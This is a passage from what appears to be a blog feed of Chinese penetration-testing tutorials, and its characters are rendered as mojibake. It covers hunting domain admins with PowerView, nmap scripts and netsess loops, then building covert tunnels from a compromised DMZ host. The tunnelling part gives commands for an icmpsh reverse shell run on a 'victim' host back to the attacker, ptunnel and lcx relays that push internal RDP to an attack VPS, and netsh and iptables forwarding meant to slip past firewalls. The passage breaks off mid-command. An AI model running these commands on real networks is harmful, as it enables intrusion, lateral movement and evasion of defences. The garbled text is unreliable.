&lt;å‚æ•°&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>-h</th><th>æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯</th></tr></thead><tbody><tr><td>-f</td><td>filename.txt:æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„æ–‡ä»¶</td></tr><tr><td>-e</td><td>filename.txt:æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåçš„æ–‡ä»¶</td></tr><tr><td>-o</td><td>filename.txt:å°†æ‰€æœ‰è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶</td></tr><tr><td>-d</td><td>filename.txt:æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„åŸŸã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨</td></tr><tr><td>-g</td><td>group:æŒ‡å®šæœç´¢çš„ç»„åã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™åœ¨Domain Adminsç»„ä¸­æœç´¢</td></tr><tr><td>-c</td><td>å¯¹å·²æ‰¾åˆ°çš„å…±äº«ç›®å½•/æ–‡ä»¶çš„è®¿é—®æƒé™è¿›è¡Œæ£€æŸ¥</td></tr></tbody></table><h3 id="nmap-è„šæœ¬"><a href="#nmap-è„šæœ¬" class="headerlink" title="nmap è„šæœ¬"></a>nmap è„šæœ¬</h3><p>å¯ä»¥ä½¿ç”¨nmapçš„<code>smb-enum-sessions.nse</code>å¼•æ“è·å–è¿œç¨‹ä¸»æœºçš„ç™»é™†ä¼šè¯ï¼ˆä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><h4 id="å…¶ä»–åŸŸæ¸—é€è„šæœ¬ï¼š"><a href="#å…¶ä»–åŸŸæ¸—é€è„šæœ¬ï¼š" class="headerlink" title="å…¶ä»–åŸŸæ¸—é€è„šæœ¬ï¼š"></a>å…¶ä»–åŸŸæ¸—é€è„šæœ¬ï¼š</h4><p><code>smb-enum-domains.nse</code>:å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰</p><p><code>smb-enum-users.nse</code>:åœ¨è¿›è¡ŒåŸŸæ¸—é€æ—¶ï¼Œå¦‚è·å–äº†åŸŸå†…æŸå°ä¸»æœºæƒé™ï¼Œä½†æƒé™æœ‰é™ï¼Œæ— æ³•è·å–æ›´å¤šçš„åŸŸç”¨æˆ·ä¿¡æ¯ï¼Œå¯å€ŸåŠ©æ­¤è„šæœ¬å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œæ‰«æ</p><p><code>smb-enum-shares.nse</code>:éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•</p><p><code>smb-enum-processes.nse</code>:å¯¹ä¸»æœºçš„ç³»ç»Ÿè¿›ç¨‹è¿›è¡Œéå†ï¼Œé€šè¿‡æ­¤ä¿¡æ¯ï¼Œå¯çŸ¥é“ç›®æ ‡ä¸»æœºè¿è¡Œç€å“ªäº›è½¯ä»¶</p><p><code>smb-enum-sessions.nse</code>:è·å–åŸŸå†…ä¸»æœºçš„ç”¨æˆ·ç™»é™†ä¼šè¯ï¼ŒæŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»é™†</p><p><code>smb-enum-discovery.nse</code>:æ”¶é›†ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿã€è®¡ç®—æœºåã€åŸŸåã€åŸŸæ—åç§°ã€NetBIOSæœºå™¨åã€NetBIOSåŸŸåã€å·¥ä½œç»„ã€ç³»ç»Ÿæ—¶é—´ç­‰ä¿¡æ¯</p><h3 id="Powerviewè„šæœ¬"><a href="#Powerviewè„šæœ¬" class="headerlink" title="Powerviewè„šæœ¬"></a>Powerviewè„šæœ¬</h3><p>ä¸»è¦æ¶‰åŠåˆ°å®šä½å…³é”®ç”¨æˆ·çš„åŠŸèƒ½å¦‚ä¸‹ä¸¤ä¸ªæ¨¡å—</p><ul><li>Invoke-StealthUserHunter:åªéœ€è¦è¿›è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œå°±å¯ä»¥è·å–åŸŸé‡Œé¢çš„æ‰€æœ‰ç”¨æˆ·ï¼Œä½¿ç”¨æ–¹æ³•ä¸ºï¼Œä»<code>user.HomeDirectories</code>ä¸­æå–æ‰€æœ‰ç”¨æˆ·ï¼Œå¹¶å¯¹æ²¡å¤ªæœåŠ¡å™¨è¿›è¡Œ<code>Get-NetSession</code>è·å–ã€‚å› ä¸éœ€è¦ä½¿ç”¨<code>Invoke-UserHunter</code>å¯¹æ²¡å¤ªæœºå™¨è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•çš„éšè”½æ€§ç›¸å¯¹è¾ƒé«˜ï¼ˆä½†æ¶‰åŠçš„æœºå™¨ä¸ä¸€å®šå…¨é¢ï¼‰ã€‚PowerViewé»˜è®¤ä½¿ç”¨<code>Invoke-StealthUserHunter</code>å¦‚æœæ‰¾ä¸åˆ°éœ€è¦çš„ä¿¡æ¯ï¼Œå°±ä½¿ç”¨<code>Invoke-UserHunter</code></li><li>Invoke-UserHunter:æ‰¾åˆ°åŸŸå†…ç‰¹å®šçš„ç”¨æˆ·ç¾¤ï¼Œæ¥å—ç”¨æˆ·åã€ç”¨æˆ·äº†è¡¨å’ŒåŸŸç»„æŸ¥è¯¢ï¼Œæ¥æ”¶ä¸€ä¸ªä¸»æœºåˆ—è¡¨æˆ–æŸ¥è¯¢å¯ç”¨çš„ä¸»æœºåŸŸåã€‚å¯ä»¥ä½¿ç”¨<code>Get-NetSession</code>å’Œ<code>Get-NetLoggedon</code>(è°ƒç”¨NetSessionEnumå’ŒNetWkstaUserEnumAPI)æ‰«ææ¯å°æœåŠ¡å™¨å¹¶å¯¹æ‰«æç»“æœè¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œæ‰¾å‡ºç›®æ ‡ç”¨æˆ·é›†ï¼Œåœ¨ä½¿ç”¨æ—¶ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œåœ¨æœ¬åœ°æ‰§è¡Œè¯¥è„šæœ¬</li></ul><h3 id="Empire-æ¨¡å—"><a href="#Empire-æ¨¡å—" class="headerlink" title="Empire æ¨¡å—"></a>Empire æ¨¡å—</h3><p>Empire æ¨¡å—ä¸­ä¹Ÿæœ‰åŠŸèƒ½å’Œinvoke-userhunterä¸€æ ·çš„æ¨¡å—ï¼Œuser_hunterï¼ŒEmpireæˆ‘å¹³æ—¶ä¹Ÿä¸å’‹ç”¨ï¼Œè¿˜å¾—åå¼¹shellåˆ°Empireå±å®æœ‰ç‚¹éº»çƒ¦ï¼Œäº†è§£äº†è§£å°±è¡Œã€‚</p><p>å®é™…çš„åŸŸé‡Œé¢ï¼Œå¤§è§„æ¨¡çš„æšä¸¾æ˜¯ä¼šæƒŠåŠ¨idsç­‰é˜²æŠ¤è®¾å¤‡çš„</p><p>ä»‹ç»å®Œå·¥å…·å†æ¥è¯´è¯´æ‰‹åŠ¨ï¼š</p><h3 id="æ‰‹å·¥é…åˆNetsessç­›é€‰æ•°æ®"><a href="#æ‰‹å·¥é…åˆNetsessç­›é€‰æ•°æ®" class="headerlink" title="æ‰‹å·¥é…åˆNetsessç­›é€‰æ•°æ®"></a>æ‰‹å·¥é…åˆNetsessç­›é€‰æ•°æ®</h3><p>é¦–å…ˆæ”¶é›†åŸŸæ§åˆ—è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group â€œDomain Controllersâ€ &#x2F;domain</span><br><span class="line">Nslookup â€“type&#x3D;SRV _ldap._tcp</span><br><span class="line">ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><p>æ”¶é›†åŸŸç®¡åˆ—è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group â€œDomain Adminsâ€ &#x2F;domain</span><br></pre></td></tr></table></figure><p>é€šè¿‡Netsess.exeæŸ¥è¯¢æ¯ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œæ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸä¼šè¯çš„åˆ—è¡¨</p><p>Netsess.exe -help #è·å–å¸®åŠ©</p><p>   -full          Full session info (requires admin)<br>   -h servername  Alternate method to specify server<br>   -u username    Username to filter for<br>   -c client name Alternate method to specify client name</p><p>cmdè”åˆå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR &#x2F;F %i in (dc.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR &#x2F;F %a in (domain_admins.txt) DO @type sessions.txt | @findstr &#x2F;I %a</span><br></pre></td></tr></table></figure><p>Dc.txtä¸ºæ”¶é›†çš„åŸŸæ§åˆ¶å™¨åˆ—è¡¨ï¼Œdomain_admins.txtä¸ºæ”¶é›†çš„åŸŸç®¡åˆ—è¡¨</p><h3 id="Get-NetLocalGroupMember-æšä¸¾è¿œç¨‹è®¡ç®—æœºæœ¬åœ°ç»„"><a href="#Get-NetLocalGroupMember-æšä¸¾è¿œç¨‹è®¡ç®—æœºæœ¬åœ°ç»„" class="headerlink" title="Get-NetLocalGroupMember æšä¸¾è¿œç¨‹è®¡ç®—æœºæœ¬åœ°ç»„"></a>Get-NetLocalGroupMember æšä¸¾è¿œç¨‹è®¡ç®—æœºæœ¬åœ°ç»„</h3><p>å®‰è£…Reconæ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy -ExecutionPolicy Bypass</span><br><span class="line">import-module .\Recon.psd1</span><br></pre></td></tr></table></figure><p>æŒ‡å®šè¿œç¨‹è®¡ç®—æœºï¼ŒæŒ‡å®šæšä¸¾ç®¡ç†å‘˜ç»„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroupMember -ComputerName ä¸»æœºå -GroupName administrators </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€-ä¿¡æ¯æ”¶é›†</title>
      <link href="2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
      <url>2021/03/17/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="1-å‰è¨€ï¼š"><a href="#1-å‰è¨€ï¼š" class="headerlink" title="1.å‰è¨€ï¼š"></a>1.å‰è¨€ï¼š</h2><p>å½“æˆ‘ä»¬åœ¨å¤–ç½‘æ‰“ä¸‹ä¸€ä¸ªç‚¹ï¼Œé€šè¿‡arpï¼Œnetstatï¼Œä»¥åŠifconifgï¼ˆipconfigï¼‰ç­‰ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ­¤ç‚¹ä¸ºdmzï¼Œå¯é€šå†…ç½‘ï¼Œé‚£ä¹ˆè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨æ­¤ç‚¹ä¸Šæ­å»ºé€šå‘å†…ç½‘çš„éš§é“ï¼Œä¸ºå†…ç½‘æ¸—é€æ‰“ä¸‹åšå®åŸºç¡€ã€‚</p><h2 id="2-å¸¸ç”¨éš§é“åˆ†ç±»ï¼š"><a href="#2-å¸¸ç”¨éš§é“åˆ†ç±»ï¼š" class="headerlink" title="2.å¸¸ç”¨éš§é“åˆ†ç±»ï¼š"></a>2.å¸¸ç”¨éš§é“åˆ†ç±»ï¼š</h2><p>æ ¹æ®ä¸åŒå±‚çš„ç½‘ç»œåè®®ï¼Œå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ç§å¸¸ç”¨çš„éš§é“ï¼š</p><h3 id="2-1-åº”ç”¨å±‚"><a href="#2-1-åº”ç”¨å±‚" class="headerlink" title="2.1 åº”ç”¨å±‚"></a>2.1 åº”ç”¨å±‚</h3><p>sshéš§é“</p><p>httpï¼ˆhttpsï¼‰éš§é“</p><p>dnséš§é“</p><h3 id="2-2-ä¼ è¾“å±‚"><a href="#2-2-ä¼ è¾“å±‚" class="headerlink" title="2.2 ä¼ è¾“å±‚"></a>2.2 ä¼ è¾“å±‚</h3><p>tcpéš§é“</p><p>udpéš§é“</p><p>å¸¸è§„ç«¯å£è½¬å‘</p><h3 id="2-3-ç½‘ç»œå±‚"><a href="#2-3-ç½‘ç»œå±‚" class="headerlink" title="2.3 ç½‘ç»œå±‚"></a>2.3 ç½‘ç»œå±‚</h3><p>Ipv6éš§é“</p><p>icmpéš§é“</p><p>greéš§é“</p><h2 id="3-åˆ¤æ–­å“ªäº›æµé‡èƒ½å‡ºç½‘"><a href="#3-åˆ¤æ–­å“ªäº›æµé‡èƒ½å‡ºç½‘" class="headerlink" title="3.åˆ¤æ–­å“ªäº›æµé‡èƒ½å‡ºç½‘"></a>3.åˆ¤æ–­å“ªäº›æµé‡èƒ½å‡ºç½‘</h2><p>æ‹¿åˆ°ä¸€ä¸ªç‚¹ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸Šæ¥å°±frpï¼Œfrpè™½ç„¶ç¨³å®šï¼Œä½†æ˜¯é‡åˆ°ä¸€äº›ç‰¹æ®Šæƒ…å†µä¹Ÿä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œå¦‚æœé‡åˆ°webæœåŠ¡å™¨æ˜¯é€šè¿‡ç«¯å£æ˜ å°„å‡ºæ¥çš„ï¼Œæœ¬èº«ä¸»æœºä¸å‡ºç½‘ï¼Œè¿™æ—¶å€™å°±å¾—ç”¨webshellä»£ç†æµé‡,å½“ç„¶è¿˜æœ‰ä¸€ç§ï¼Œéœ€è¦é€šè¿‡ç‰¹å®šä»£ç†çš„æœåŠ¡å™¨æ‰èƒ½å‡ºç½‘ï¼Œè¿™æ—¶å€™å¯ä»¥åšæµè§ˆå™¨çš„ä¿¡æ¯æ”¶é›†ï¼Œè¿™ç§æƒ…å†µå¤–ç½‘èµ„äº§æ‰«ç«¯å£ä¹Ÿå¯ä»¥è§ï¼Œnmapæ‰«å‡ºæ¥çš„æœåŠ¡ä¸ºsocketsæˆ–è€…proxyæœåŠ¡ä»€ä¹ˆçš„ã€‚</p><p>ç»¼åˆåˆ¤æ–­å‡ ç§åè®®çš„å‡ºç½‘æƒ…å†µ</p><h3 id="3-1-icmpåè®®"><a href="#3-1-icmpåè®®" class="headerlink" title="3.1 icmpåè®®"></a>3.1 icmpåè®®</h3><p>ping å‘½ä»¤</p><h3 id="3-2-Httpåè®®"><a href="#3-2-Httpåè®®" class="headerlink" title="3.2 Httpåè®®"></a>3.2 Httpåè®®</h3><h4 id="linuxï¼š"><a href="#linuxï¼š" class="headerlink" title="linuxï¼š"></a>linuxï¼š</h4><p>wget å‘½ä»¤</p><p>curl å‘½ä»¤</p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows:"></a>Windows:</h4><p>telnet</p><p>æµè§ˆå™¨</p><h3 id="dnsåè®®ï¼š"><a href="#dnsåè®®ï¼š" class="headerlink" title="dnsåè®®ï¼š"></a>dnsåè®®ï¼š</h3><p>æŒ‡å‘å¤–ç½‘çš„vpsä½œä¸ºdnsæœåŠ¡å™¨è§£æåŸŸå</p><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><p>Nslookup baidu.com vps</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>dig@vps Baidu.com</p><h2 id="4-æ­å»ºéš§é“å®æˆ˜"><a href="#4-æ­å»ºéš§é“å®æˆ˜" class="headerlink" title="4.æ­å»ºéš§é“å®æˆ˜"></a>4.æ­å»ºéš§é“å®æˆ˜</h2><h3 id="4-1-æ­å»ºipv6éš§é“"><a href="#4-1-æ­å»ºipv6éš§é“" class="headerlink" title="4.1 æ­å»ºipv6éš§é“"></a>4.1 æ­å»ºipv6éš§é“</h3><p>å‰æï¼šæ”¯æŒipv6ï¼Œé€šè¿‡ipconfigï¼ˆifconfigï¼‰çœ‹æœ‰æ²¡æœ‰ipv6çš„åœ°å€</p><p>ç‰¹ç‚¹ï¼šè¿‡å®‰å…¨è®¾å¤‡ï¼Œé˜²ç«å¢™å¥‡æ•ˆ</p><p>åŸç†ï¼šæŠŠipv6åè®®å°è£…æ•°æ®åŒ…åç»§ç»­ç”¨ipv4å°è£…ï¼Œæœ¬è´¨åœ¨ç½‘ç»œä¸­ä¼ è¾“è¿˜æ˜¯ipv4ï¼Œä¸€äº›å®‰å…¨è®¾å¤‡å’Œé˜²ç«å¢™ä¸æ”¯æŒipv6ï¼Œæ‰€ä»¥å°±ç®—æ‹¿åˆ°äº†è¿›è¡Œåˆ†æä¹Ÿè§£ä¸äº†åŒ…ã€‚</p><p>è¿™é‡Œæˆ‘ä»¥6tunnelä¸ºä¾‹ï¼š</p><p>githubï¼š<a href="https://github.com/wojtekka/6tunnel">https://github.com/wojtekka/6tunnel</a></p><p>gccç¼–è¯‘</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315215548963.png"></p><p>ç«¯å£è½¬å‘ï¼š</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;6tunnel -4 80 éœ€è¦è½¬å‘çš„ipv6%eth0 80#å°†ipv6åœ°å€80ç«¯å£è½¬å‘åˆ°æœ¬åœ°ipv4æ¥ï¼Œä½ ä¹Ÿå¯ä»¥æ¢æˆ-6</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210315220238278.png"></p><blockquote><p>æ³¨æ„ï¼šipv6éš§é“å¯ä»¥ä»ipv6åœ°å€åˆ°ipv6åœ°å€ï¼Œä¹Ÿå¯ä»¥ä»ipv4åœ°å€åˆ°ipv6åœ°å€ï¼Œä½†ä¸èƒ½ä»ipv6åˆ°ipv4ã€‚å¦‚æœä»æœ¬æœºçš„ipv6åœ°å€åˆ°ç›®æ ‡æœºçš„ipv4ï¼Œæµ‹è¯•æŠ“åˆ°çš„åŒ…æ˜¯ipv4çš„åŒ…ï¼Œå¹¶ä¸ä¼šå¯¹æ•°æ®åŒ…è¿›è¡Œipv6å°è£…ï¼Œ%æ˜¯åˆ¶å®šç½‘å¡</p></blockquote><p>è®¿é—®ipv6åœ°å€æ—¶éœ€æŒ‡å®šç½‘å¡ï¼Œä¾‹å¦‚http://[fe80::xxxx:xxxx%eth0]ï¼Œæˆ–è€…curl -6 -g â€“interface eth0 â€œhttp://[fe80::20c:29ff:fe0f:57ba]:80â€ -vvv</p><h3 id="4-2-æ­å»ºicmpéš§é“"><a href="#4-2-æ­å»ºicmpéš§é“" class="headerlink" title="4.2 æ­å»ºicmpéš§é“"></a>4.2 æ­å»ºicmpéš§é“</h3><p>å‰æï¼šé˜²ç«å¢™wafæœ‰å…è®¸icmpåŒ…æ–‡é€šè¿‡ï¼Œå…³é—­ç³»ç»Ÿicmpè‡ªåŠ¨ç­”å¤ï¼Œå®‰è£…python-impacket</p><p>ç‰¹ç‚¹ï¼šç®€å•ï¼Œå®ç”¨</p><p>åŸç†ï¼šå°†tcp/udp æ•°æ®å°è£…åˆ°icmpçš„pingæ•°æ®åŒ…ä¸­ï¼Œä»è€Œå»ºç«‹é€šä¿¡</p><p>githubï¼š<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><h4 id="åå¼¹shellï¼š"><a href="#åå¼¹shellï¼š" class="headerlink" title="åå¼¹shellï¼š"></a>åå¼¹shellï¼š</h4><p>å…³é—­æœ¬åœ°çš„icmpåº”ç­”ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ä¸»æœºç›‘å¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python icmpsh_m.py 192.168.75.131ï¼ˆæœ¬åœ°ipï¼‰ 192.168.75.132ï¼ˆå—å®³è€…ipï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210316183155801.png"></p><p>åœ¨å—å®³è€…ä¸»æœºè¿è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t 192.168.75.131ï¼ˆæ”»å‡»è€…ï¼‰</span><br></pre></td></tr></table></figure><h4 id="ç«¯å£è½¬å‘ï¼š"><a href="#ç«¯å£è½¬å‘ï¼š" class="headerlink" title="ç«¯å£è½¬å‘ï¼š"></a>ç«¯å£è½¬å‘ï¼š</h4><p>ä½¿ç”¨çš„æ˜¯ï¼šptunnel kaliè‡ªå¸¦</p><p>éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libpcapç¯å¢ƒ</span><br><span class="line">libpcapä¾èµ–åº“</span><br><span class="line">wget http:&#x2F;&#x2F;www.cs.uit.no&#x2F;~daniels&#x2F;PingTunnel&#x2F;PingTunnel-0.72.tar.gz</span><br></pre></td></tr></table></figure><p>åœ¨æ”»å‡»vpsä¸Šæ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 182.17.13.17(è·³æ¿æœºå¤–ç½‘ip) -lp 8888 -da 10.10.10.18ï¼ˆå†…ç½‘éœ€è¦è½¬å‘ç«¯å£çš„ipï¼‰ -dp 3389 -x Gamma</span><br></pre></td></tr></table></figure><p>åœ¨è·³æ¿æœºä¸Šæ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x Gamma</span><br></pre></td></tr></table></figure><p>å†…ç½‘10.10.10.18 3389ç«¯å£å°±è¢«è½¬å‘åˆ°æ”»å‡»vpsçš„8888ç«¯å£äº†</p><h3 id="icmpéš§é“æ­å»º"><a href="#icmpéš§é“æ­å»º" class="headerlink" title="icmpéš§é“æ­å»º"></a>icmpéš§é“æ­å»º</h3><p>å®‰è£…icmptunnel</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jamesbarlow/icmptunnel.git</span></span><br><span class="line">cd icmptunnel</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éœ€åŒæ—¶ç¦ç”¨icmpç­”å¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ”»å‡»è€…ä¸ºæœåŠ¡ç«¯ï¼Œå—å®³è€…ä¸ºå®¢æˆ·ç«¯</p><p>æœåŠ¡ç«¯é…ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;icmptunnel -s#ä»¥æœåŠ¡ç«¯å¯åŠ¨</span><br><span class="line">&#x2F;sbin&#x2F;ifconfig tun0 10.0.0.1 netmask 255.255.255.0 #é…ç½®ä¸€ä¸ªip</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯é…ç½®ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./icmptunnel <span class="number">192.168</span><span class="number">.75</span><span class="number">.131</span>ï¼ˆæœåŠ¡ç«¯ipï¼‰</span><br><span class="line">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 #é…ç½®ä¸€ä¸ªip</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥éš§é“è¿›è¡Œé€šä¿¡äº†</p><h3 id="4-2-tcpç«¯å£è½¬å‘"><a href="#4-2-tcpç«¯å£è½¬å‘" class="headerlink" title="4.2 tcpç«¯å£è½¬å‘"></a>4.2 tcpç«¯å£è½¬å‘</h3><h4 id="windowsï¼š"><a href="#windowsï¼š" class="headerlink" title="windowsï¼š"></a>windowsï¼š</h4><p>å·¥å…·ï¼šlcx.exe netsh â€¦â€¦â€¦</p><p>æŠŠå†…ç½‘ä¸»æœºçš„ 3389 ç«¯å£è½¬å‘åˆ°å…·æœ‰å…¬ç½‘ipä¸»æœºçš„ 4444 ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave å…¬ç½‘ip 8888 å†…ç½‘ip 3389</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ­å»ºç«¯å£ä¹‹é—´çš„éš§é“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe â€“listen 8888 3389#æœ¬åœ°3389å’Œ8888ç«¯å£è¿›è¡Œè¿æ¥</span><br></pre></td></tr></table></figure><p><code>netsh</code>ä»…æ”¯æŒTCPåè®®ï¼Œ é€‚ç”¨äº<strong>åŒç½‘å¡</strong>æœåŠ¡å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥çœ‹ç°æœ‰è§„åˆ™</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">#æ·»åŠ è½¬å‘è§„åˆ™</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;å¤–ç½‘IP listenport&#x3D;6666 connectaddress&#x3D;å†…ç½‘IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#åˆ é™¤è½¬å‘è§„åˆ™</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br><span class="line"></span><br><span class="line">#xpéœ€è¦å®‰è£…ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><p>è¿æ¥å¤–ç½‘6666ç«¯å£ï¼Œå°±æ˜¯è¿æ¥åˆ°å†…ç½‘ç›®æ ‡ä¸Šé¢çš„3389ã€‚</p><p>linuxï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 2 -p1 4444 -h2 å…¬ç½‘ä¸»æœºip -p2 3389</span><br></pre></td></tr></table></figure><p>å°†4444ç«¯å£çš„æµé‡è½¬å‘åˆ°3389ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 å…¬ç½‘ä¸»æœºip -p2 4444#å†…ç½‘ä¸»æœºæ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>æŠŠå†…ç½‘çš„22ç«¯å£è½¬å‘åˆ°å¤–ç½‘çš„3389ç«¯å£ </p><p>linux iptablesä½¿ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#ç¼–è¾‘é…ç½®æ–‡ä»¶</span><br><span class="line">vi &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">net.ipv4.ip_forward &#x3D; 1#å¼€å¯IPè½¬å‘</span><br><span class="line">#å…³é—­æœåŠ¡</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span 